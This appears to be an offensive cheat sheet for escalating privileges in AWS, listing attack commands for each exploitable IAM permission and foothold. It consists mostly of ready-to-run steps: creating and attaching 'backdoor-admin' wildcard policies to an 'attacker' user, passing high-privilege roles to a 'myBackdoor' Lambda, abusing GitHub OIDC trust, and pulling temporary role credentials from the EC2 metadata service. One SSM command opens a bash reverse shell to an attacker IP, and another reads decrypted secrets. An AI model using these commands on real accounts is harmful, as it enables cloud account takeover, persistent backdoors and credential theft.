# Privilege Escalation (Detailed, By Permission and Foothold)

## ✅ Common Permissions for Escalation
---

## 🔑 iam:PassRole

**Goal:** Launch an EC2 or Lambda with a higher-privileged role.

**Steps:**

1️⃣ **List available roles to pass:**  
```bash
aws iam list-roles
```

2️⃣ **Launch an EC2 instance with the chosen role:**  
```bash
aws ec2 run-instances   --image-id ami-xxxxxx   --instance-type t2.micro   --iam-instance-profile Name=<RoleName>   --key-name my-keypair
```

**Or launch a Lambda with the role:**  
```bash
aws lambda create-function   --function-name myBackdoor   --role arn:aws:iam::<account-id>:role/<RoleName>   --runtime python3.8   --handler lambda_function.lambda_handler   --zip-file fileb://function.zip
```

---

## 🔑 iam:SetDefaultPolicyVersion

**Goal:** Roll back to a more permissive older policy version.

**Steps:**

1️⃣ **List policy versions:**  
```bash
aws iam list-policy-versions --policy-arn <policy-arn>
```

2️⃣ **View the older version:**  
```bash
aws iam get-policy-version   --policy-arn <policy-arn>   --version-id v1
```

3️⃣ **Set the older version as default:**  
```bash
aws iam set-default-policy-version   --policy-arn <policy-arn>   --version-id v1
```

---

## 🔑 iam:CreatePolicy + iam:AttachUserPolicy

**Goal:** Create a new admin policy and attach it to your user.

**Steps:**

1️⃣ **Create an admin policy document:**  
`admin-policy.json`  
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
```

2️⃣ **Create the new policy:**  
```bash
aws iam create-policy   --policy-name backdoor-admin   --policy-document file://admin-policy.json
```

3️⃣ **Attach the new policy to your user:**  
```bash
aws iam attach-user-policy   --user-name attacker   --policy-arn arn:aws:iam::<account-id>:policy/backdoor-admin
```

---

## 🔑 sts:AssumeRole

**Goal:** Assume a higher-privileged role directly.

**Steps:**

1️⃣ **List roles:**  
```bash
aws iam list-roles
```

2️⃣ **Read the trust policy for conditions (like External ID):**  
```bash
aws iam get-role --role-name <RoleName>
```

3️⃣ **Assume the role:**  
```bash
aws sts assume-role   --role-arn arn:aws:iam::<account-id>:role/<RoleName>   --role-session-name attacker-session   --external-id <ExternalID_if_needed>
```

4️⃣ **Use the returned temporary credentials to pivot:**  
```bash
export AWS_ACCESS_KEY_ID="..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
```

5️⃣ **Check your new identity:**  
```bash
aws sts get-caller-identity
```

---

## 🔑 iam:PutRolePolicy
Add an inline admin policy to a role you can assume.
```bash
aws iam put-role-policy   --role-name target-role   --policy-name backdoor-admin   --policy-document file://admin-policy.json
```
(*admin-policy.json should grant `Action: "*"` on `Resource: "*"`).

---

## 🔑 iam:AddUserToGroup
Add your user to a privileged IAM group.
```bash
aws iam add-user-to-group   --group-name Admins   --user-name attacker
```

---

## 🔑 iam:UpdateAssumeRolePolicy
Modify a role's trust policy to trust your user.
```bash
aws iam update-assume-role-policy   --role-name target-role   --policy-document file://attacker-trust-policy.json
```

---

## 🔑 iam:CreatePolicyVersion
Create a new, more permissive version of an existing policy and set it as default.
```bash
aws iam create-policy-version   --policy-arn arn:aws:iam::123456789012:policy/target-policy   --policy-document file://admin-policy.json   --set-as-default
```

---

## 🔑apigateway:UpdateRestApiPolicy
Create new rest policy 
```
# Unescape & format policy JSON
cat policy.json | sed 's/\\\\\\//g' | jq

# Update policy
aws apigateway update-rest-api --rest-api-id <api-id> \
  --patch-operations op=replace,path=/policy,value='<policy-json>'

#redeploy to apply changes 
aws apigateway create-deployment \
  --rest-api-id <api-id> \
  --stage-name <stage>

```

## 🔑 ssm:SendCommand 
```
# REverse shell 
aws ssm send-command \
  --document-name "AWS-RunShellScript" \
  --targets "Key=instanceIds,Values=<INSTANCE_ID>" \
  --comment "Run shell as backdoor" \
  --parameters 'commands=["bash -i >/dev/tcp/<ATTACKER_IP>/8080 0<&1 2>&1"]' \
  --region <REGION>

#get secrets 
aws ssm get-parameter \
  --name "<parameter-name>" \
  --with-decryption \
  --region <region>

```

## ✅ If you have GitHub/GitLab Repo Access (OIDC Abuse)

**Goal:** Mint an OIDC token using CI/CD, exploit broad trust, assume a trusted AWS role.

**Requirements:**
- Valid AWS creds for trust policy checks (`ListRoles` + `GetRole`).
- Write access to a repo matching the trusted `sub`.

**Steps:**
1. Use `github-oidc-checker` or `aws-oidc-tester.py` to find vulnerable OIDC trust.
2. Create a workflow like:

```yaml
name: OIDC Assume Role
on:
  push:
    branches: [ main ]
permissions:
  id-token: write
  contents: read
jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: aws-actions/configure-aws-credentials@v3
        with:
          role-to-assume: arn:aws:iam::<account>:role/<role>
          role-session-name: oidc
          aws-region: us-east-1
      - run: aws sts get-caller-identity
```

3. Push → run Actions → assume role → pivot.


# ✅ If are on an EC2 instance already 

 🔑 IMDSv1

Quick check to see metadata paths
```
curl http://169.254.169.254/latest/
```

🔑 IMDSv2 (recommended & more common)

Get a session token (valid for 6 hours here)
```
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
```

Use token to query metadata
```
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/
```

To get IAM Role name (Instance Profile)
```
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

To get temporary creds for the role
```
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<RoleName>
```

